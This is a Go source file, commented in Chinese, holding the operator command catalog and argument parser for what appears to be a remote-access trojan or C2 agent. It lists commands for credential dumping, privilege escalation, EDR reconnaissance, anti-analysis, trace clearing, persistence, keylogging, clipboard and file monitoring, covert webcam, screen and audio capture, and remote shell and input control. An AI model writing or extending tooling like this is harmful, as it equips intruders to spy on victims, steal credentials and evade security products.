// cli_catalog.go — Agent 命令目录: CLI 呈现层映射。
//
// 的 DEF_CMD 为**唯一事实源** —— 每条 CmdDesc 注释标注 CmdDef 命名空间;
// Agent 侧加/改命令必须同步本文件(参数名以 Agent Handler 的 params.find 实测为准)。
// RemoteKeyboardEvent 是 key/modifiers(旧 key_code/action 错); SelfDelete/OpenUrl
// 在 CmdDef 中无定义已删除(旧 catalog 幻影命令)。
//
// 命名约定(peng 立案, Sliver 惯例): CLIName 是操作员敲的短名, Name 是协议命令名
// (= DEF_CMD 第二参数, 不可改 —— Agent 按名分发); 协议原名自动进 Aliases。
// A→S 方向命令(*Data/*Report/*Complete/Poll/FirstConnect 等)是 Agent 上报,
// 不进操作员目录。
package cli

import "strconv"

// ParamDesc 描述一个命令参数。参数名以 Agent Handler 实测(Components/Commands/*/Handler/*.cpp)。
type ParamDesc struct {
	Key      string // JSON key(Agent 实际读取的)
	Label    string // 中文说明
	Type     string // "string", "int", "float", "bool"
	Required bool
	Example  string
}

// CmdDesc 描述一个 Agent 命令。
type CmdDesc struct {
	CLIName  string // CLI 正名(Sliver 惯例缩写)
	Name     string // Agent 协议命令名(权威, = CmdDef.hpp DEF_CMD 第二参数)
	Desc     string
	Category string
	Params   []ParamDesc
}

// agentCommands 全部 S→A 命令目录(以 CmdDef.hpp 为唯一事实源)。
var agentCommands = []CmdDesc{
	// ---- 侦察(Discovery) ----
	{CLIName: "sysinfo", Name: "GetSystemInfo", Desc: "系统信息(主机名/OS/CPU/内存)", Category: "侦察"}, // CmdDef::GetSystemInfo
	{CLIName: "ps", Name: "EnumProcess", Desc: "枚举进程列表", Category: "侦察"},                     // CmdDef::ProcessManager::Enum
	{CLIName: "services", Name: "EnumService", Desc: "枚举服务列表", Category: "侦察"},               // CmdDef::ServiceManager::Enum
	{CLIName: "drivers", Name: "EnumDriver", Desc: "枚举驱动列表", Category: "侦察"},                 // CmdDef::DriverManager::Enum
	{CLIName: "apps", Name: "EnumSoftware", Desc: "枚举已安装软件", Category: "侦察"},                 // CmdDef::SoftwareManager::Enum
	{CLIName: "windows", Name: "EnumWindow", Desc: "枚举窗口列表", Category: "侦察"},                 // CmdDef::WindowManager::Enum
	{CLIName: "netstat", Name: "EnumNetwork", Desc: "枚举网络连接", Category: "侦察"},                // CmdDef::NetworkManager::Enum
	{CLIName: "edrscan", Name: "EdrScan", Desc: "EDR/AV 产品与内核驱动侦察", Category: "侦察"},          // CmdDef::EdrRecon::Scan
	{CLIName: "domainenum", Name: "Discovery", Desc: "域环境枚举(域控/共享/用户)", Category: "侦察"},      // CmdDef::Offensive::Discovery

	// ---- 进程(ProcessManager) ----
	{CLIName: "kill", Name: "KillProcess", Desc: "终止进程", Category: "进程",
		Params: []ParamDesc{{Key: "pid", Label: "进程ID", Type: "int", Required: true, Example: "1234"}}}, // 实测: pid
	{CLIName: "psuspend", Name: "SuspendProcess", Desc: "挂起进程", Category: "进程",
		Params: []ParamDesc{{Key: "pid", Label: "进程ID", Type: "int", Required: true}}}, // 实测: pid
	{CLIName: "presume", Name: "ResumeProcess", Desc: "恢复进程", Category: "进程",
		Params: []ParamDesc{{Key: "pid", Label: "进程ID", Type: "int", Required: true}}}, // 实测: pid

	// ---- 服务/驱动(ServiceManager/DriverManager) ----
	{CLIName: "startsvc", Name: "StartService", Desc: "启动服务", Category: "服务",
		Params: []ParamDesc{{Key: "name", Label: "服务名", Type: "string", Required: true}}}, // 实测: name
	{CLIName: "stopsvc", Name: "StopService", Desc: "停止服务", Category: "服务",
		Params: []ParamDesc{{Key: "name", Label: "服务名", Type: "string", Required: true}}}, // 实测: name
	{CLIName: "startdrv", Name: "StartDriver", Desc: "启动驱动", Category: "服务",
		Params: []ParamDesc{{Key: "name", Label: "驱动名", Type: "string", Required: true}}}, // 实测: name
	{CLIName: "stopdrv", Name: "StopDriver", Desc: "停止驱动", Category: "服务",
		Params: []ParamDesc{{Key: "name", Label: "驱动名", Type: "string", Required: true}}}, // 实测: name

	// ---- 文件(FileManager; Sliver 惯例: ls/rm/mkdir/mv/cp/download/upload) ----
	{CLIName: "drives", Name: "FileGetDrives", Desc: "获取盘符列表", Category: "文件"}, // CmdDef::FileManager::GetDrives
	{CLIName: "ls", Name: "FileListDir", Desc: "列出目录内容", Category: "文件",
		Params: []ParamDesc{{Key: "path", Label: "目录路径", Type: "string", Required: true, Example: "C:\\\\"}}}, // 实测: path
	{CLIName: "rm", Name: "FileDelete", Desc: "删除文件", Category: "文件",
		Params: []ParamDesc{{Key: "path", Label: "文件路径", Type: "string", Required: true}}}, // 实测: path
	{CLIName: "mkdir", Name: "FileCreateDir", Desc: "创建目录", Category: "文件",
		Params: []ParamDesc{{Key: "path", Label: "目录路径", Type: "string", Required: true}}}, // 实测: path
	{CLIName: "mv", Name: "FileMove", Desc: "移动/重命名文件", Category: "文件",
		Params: []ParamDesc{
			{Key: "src", Label: "源路径", Type: "string", Required: true},
			{Key: "dst", Label: "目标路径", Type: "string", Required: true}}}, // 实测: src,dst
	{CLIName: "cp", Name: "FileCopy", Desc: "复制文件", Category: "文件",
		Params: []ParamDesc{
			{Key: "src", Label: "源路径", Type: "string", Required: true},
			{Key: "dst", Label: "目标路径", Type: "string", Required: true}}}, // 实测: src,dst
	{CLIName: "chmod", Name: "FileChmod", Desc: "修改权限(仅Linux生效)", Category: "文件",
		Params: []ParamDesc{
			{Key: "path", Label: "文件路径", Type: "string", Required: true},
			{Key: "mode", Label: "权限模式(八进制语义)", Type: "int", Example: "755"}}}, // 实测: path,mode
	{CLIName: "download", Name: "FileDownloadReq", Desc: "下载文件(Agent→Server)", Category: "文件",
		Params: []ParamDesc{{Key: "path", Label: "文件路径", Type: "string", Required: true}}}, // 实测: path
	{CLIName: "upload", Name: "FileUploadReq", Desc: "上传文件(Server→Agent)", Category: "文件",
		Params: []ParamDesc{{Key: "path", Label: "目标路径", Type: "string", Required: true}}}, // 实测: path

	// ---- 屏幕/摄像头(CameraShot/Camera/CameraStream/DesktopStream) ----
	{CLIName: "screenshot", Name: "ScreenShotSingleShot", Desc: "单次截图", Category: "屏幕",
		Params: []ParamDesc{{Key: "quality", Label: "质量(1-100)", Type: "int", Example: "85"}}}, // 实测: quality,scale
	{CLIName: "camshot", Name: "CameraCapture", Desc: "摄像头拍照", Category: "屏幕",
		Params: []ParamDesc{{Key: "quality", Label: "质量(1-100)", Type: "int", Example: "85"}}}, // 实测: quality
	{CLIName: "deskstream-on", Name: "DesktopStreamStart", Desc: "桌面流开始", Category: "屏幕"},
	{CLIName: "deskstream-off", Name: "DesktopStreamStop", Desc: "桌面流停止", Category: "屏幕"},
	{CLIName: "camstream-on", Name: "CameraStreamStart", Desc: "摄像头流开始", Category: "屏幕"},
	{CLIName: "camstream-off", Name: "CameraStreamStop", Desc: "摄像头流停止", Category: "屏幕"},

	// ---- 音频(Audio) ----
	{CLIName: "audio-on", Name: "AudioStartRecord", Desc: "录音开始", Category: "音频"},
	{CLIName: "audio-off", Name: "AudioStopRecord", Desc: "录音停止", Category: "音频"},

	// ---- 键盘/剪贴板/监控(Keylog/Clipboard/ClipboardMonitor/FileMonitor) ----
	// 注: 流命令 interval 走 Agent config 域(SetConfig), 不在 params(实测 handler 无 params.find)。
	{CLIName: "keylog-on", Name: "KeylogStart", Desc: "键盘记录开始", Category: "监控"},
	{CLIName: "keylog-off", Name: "KeylogStop", Desc: "键盘记录停止", Category: "监控"},
	{CLIName: "clipboard", Name: "ClipboardGet", Desc: "读取剪贴板", Category: "监控"}, // 实测: 无参
	{CLIName: "clipset", Name: "ClipboardSet", Desc: "写入剪贴板", Category: "监控",
		Params: []ParamDesc{{Key: "text", Label: "文本内容", Type: "string", Required: true}}}, // 实测: text
	{CLIName: "clipmon-on", Name: "ClipboardMonitorStart", Desc: "剪贴板监控开始", Category: "监控"},
	{CLIName: "clipmon-off", Name: "ClipboardMonitorStop", Desc: "剪贴板监控停止", Category: "监控"},
	{CLIName: "filemon-on", Name: "FileMonitorStart", Desc: "文件变更监控开始", Category: "监控",
		Params: []ParamDesc{{Key: "path", Label: "监控目录", Type: "string", Example: "C:\\\\Users"}}},
	{CLIName: "filemon-off", Name: "FileMonitorStop", Desc: "文件变更监控停止", Category: "监控"},

	// ---- 凭据/提权/对抗(Offensive) ----
	{CLIName: "hashdump", Name: "CredentialCollect", Desc: "凭据采集(WiFi/SAM/浏览器)", Category: "对抗"}, // CmdDef::Offensive::CredentialCollect
	{CLIName: "elevate", Name: "Elevate", Desc: "提权", Category: "对抗"},                            // CmdDef::Offensive::Elevate
	{CLIName: "antiscan", Name: "AntiAnalysisScan", Desc: "反分析检测", Category: "对抗"},               // CmdDef::Offensive::AntiAnalysisScan
	{CLIName: "anticonfig", Name: "ApplyAntiConfig", Desc: "应用对抗配置(持久化等)", Category: "对抗",
		Params: []ParamDesc{{Key: "config", Label: "配置JSON", Type: "object", Required: true}}}, // 实测: config
	{CLIName: "cleart", Name: "ClearTraces", Desc: "痕迹清理(T1070)", Category: "对抗"}, // CmdDef::Offensive::ClearTraces
	{CLIName: "persist-on", Name: "PersistenceApply", Desc: "应用持久化", Category: "对抗"},
	{CLIName: "persist-off", Name: "PersistenceRemove", Desc: "卸载持久化(幂等)", Category: "对抗"},

	// ---- 注册表(RegistryManager; 参数以 RegistryGetValueHandler/RegistryEnumHandler 实测为准) ----
	{CLIName: "regenum", Name: "RegistryEnumKey", Desc: "枚举子键与值", Category: "注册表",
		Params: []ParamDesc{{Key: "path", Label: "注册表路径", Type: "string", Required: true}}}, // 实测: path
	{CLIName: "regkey", Name: "RegistryGetValue", Desc: "读取注册表值", Category: "注册表",
		Params: []ParamDesc{
			{Key: "path", Label: "注册表路径", Type: "string", Required: true, Example: "HKCU\\\\Software\\\\..."},
			{Key: "value", Label: "值名称", Type: "string", Required: true}}}, // 实测: path,value(旧 catalog 写 key/value_name 是错的)

	// ---- 远程输入(RemoteInput) ----
	{CLIName: "mouse", Name: "RemoteInputMouseEvent", Desc: "远程鼠标事件", Category: "远程输入",
		Params: []ParamDesc{
			{Key: "x", Label: "X坐标", Type: "int", Required: true},
			{Key: "y", Label: "Y坐标", Type: "int", Required: true},
			{Key: "button", Label: "按钮(left/right/middle)", Type: "string"},
			{Key: "action", Label: "动作(click/down/up)", Type: "string"}}}, // 实测: x,y
	{CLIName: "keyin", Name: "RemoteInputKeyboardEvent", Desc: "远程键盘事件", Category: "远程输入",
		Params: []ParamDesc{
			{Key: "key", Label: "按键", Type: "string", Required: true},
			{Key: "modifiers", Label: "修饰键", Type: "string"}}}, // 实测: key,modifiers(旧 key_code/action 是错的)
	{CLIName: "charin", Name: "RemoteInputCharEvent", Desc: "远程字符输入", Category: "远程输入",
		Params: []ParamDesc{{Key: "char", Label: "字符", Type: "string", Required: true}}}, // 实测: char
	{CLIName: "input-lock", Name: "RemoteInputLock", Desc: "锁定远程输入", Category: "远程输入"},
	{CLIName: "input-unlock", Name: "RemoteInputUnlock", Desc: "解锁远程输入", Category: "远程输入"},

	// ---- 终端(Terminal) ----
	{CLIName: "shell-start", Name: "TerminalStart", Desc: "启动远程终端", Category: "终端"},
	{CLIName: "shellin", Name: "TerminalInput", Desc: "终端输入", Category: "终端",
		Params: []ParamDesc{{Key: "command", Label: "命令", Type: "string", Required: true}}},
	{CLIName: "shellclose", Name: "TerminalClose", Desc: "关闭远程终端", Category: "终端"},

	// ---- 窗口控制(WindowManager; 实测: handle) ----
	{CLIName: "closewin", Name: "CloseWindow", Desc: "关闭窗口", Category: "窗口",
		Params: []ParamDesc{{Key: "handle", Label: "窗口句柄", Type: "int", Required: true}}}, // 实测: handle
	{CLIName: "topmost", Name: "SetTopMostWindow", Desc: "窗口置顶", Category: "窗口",
		Params: []ParamDesc{{Key: "handle", Label: "窗口句柄", Type: "int", Required: true}}}, // 实测: handle
	{CLIName: "untopmost", Name: "RemoveTopMostWindow", Desc: "取消窗口置顶", Category: "窗口",
		Params: []ParamDesc{{Key: "handle", Label: "窗口句柄", Type: "int", Required: true}}}, // 实测: handle

	// ---- 系统控制(PcManager/System) ----
	{CLIName: "shutdown", Name: "ShutdownPC", Desc: "关机", Category: "系统"},
	{CLIName: "reboot", Name: "RebootPC", Desc: "重启", Category: "系统"},
	{CLIName: "logout", Name: "LogoutPC", Desc: "注销", Category: "系统"},
	{CLIName: "lock", Name: "LockPC", Desc: "锁屏", Category: "系统"},
	{CLIName: "monitors", Name: "SystemSetMonitorPower", Desc: "显示器电源", Category: "系统",
		Params: []ParamDesc{{Key: "state", Label: "状态(on/off)", Type: "string", Required: true}}}, // 实测: state

	// ---- 运行时配置(Runtime) ----
	{CLIName: "config", Name: "SetConfig", Desc: "运行时下发调参(心跳/重连/通道/poll 等域整包 JSON)", Category: "配置",
		Params: []ParamDesc{{Key: "params", Label: "配置JSON整包(扁平)", Type: "object", Required: true}}},
	{CLIName: "getconfig", Name: "GetConfig", Desc: "配置回读(当前生效全量)", Category: "配置"},

	// ---- 其他 ----
	{CLIName: "exit-agent", Name: "ExitProgram", Desc: "退出 Agent(危险!)", Category: "其他"}, // CmdDef::ExitProgram
	// ModuleLoad 不进通用目录: 需 HybridUpload 特殊帧(帧二进制体=模块字节), 用 `module load` 命令。
	// MigrateSpawn 同理: 用 `migrate` 命令。
}

// findCmd 在目录中查找命令定义(优先协议名, 其次 CLIName)。
func findCmd(name string) *CmdDesc {
	for i := range agentCommands {
		if agentCommands[i].Name == name || agentCommands[i].CLIName == name {
			return &agentCommands[i]
		}
	}
	return nil
}

// paramsFromCatalog 位置参数 → JSON params(按命令目录的 Params 定义顺序映射)。
// 这是 CLI "不用写 JSON!" 速记的灵魂; 类型转换失败静默跳过(原行为),
// 必填检查不在此处(与原行为一致——由 Agent 侧校验)。
func paramsFromCatalog(cmdName string, positional []string) map[string]interface{} {
	def := findCmd(cmdName)
	if def == nil || len(def.Params) == 0 || len(positional) == 0 {
		return nil
	}
	m := map[string]interface{}{}
	for i, p := range def.Params {
		if i >= len(positional) {
			break
		}
		v := positional[i]
		switch p.Type {
		case "int":
			if n, err := strconv.Atoi(v); err == nil {
				m[p.Key] = n
			}
		case "float":
			if n, err := strconv.ParseFloat(v, 64); err == nil {
				m[p.Key] = n
			}
		case "bool":
			if b, err := strconv.ParseBool(v); err == nil {
				m[p.Key] = b
			}
		default:
			m[p.Key] = v
		}
	}
	return m
}
